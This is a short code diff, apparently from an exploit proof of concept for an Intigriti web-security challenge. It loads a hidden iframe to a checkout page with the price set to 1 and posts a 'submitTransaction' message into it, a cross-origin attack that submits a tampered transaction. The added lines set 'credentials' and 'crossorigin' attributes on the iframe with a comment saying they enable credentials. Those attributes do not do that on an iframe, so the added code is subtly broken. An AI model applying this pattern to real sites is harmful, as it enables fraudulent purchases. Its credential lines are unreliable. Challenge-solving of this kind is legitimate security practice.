@@ -4,6 +4,11 @@
     const ifr = document.createElement('iframe');
     ifr.src = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
     ifr.style.display = 'none';
+    
+    // Enable credentials for the iframe
+    ifr.setAttribute('credentials', 'include');
+    ifr.setAttribute('crossorigin', 'use-credentials');
+    
     ifr.onload = () => {
         ifr.contentWindow.postMessage({
             type: 'submitTransaction',
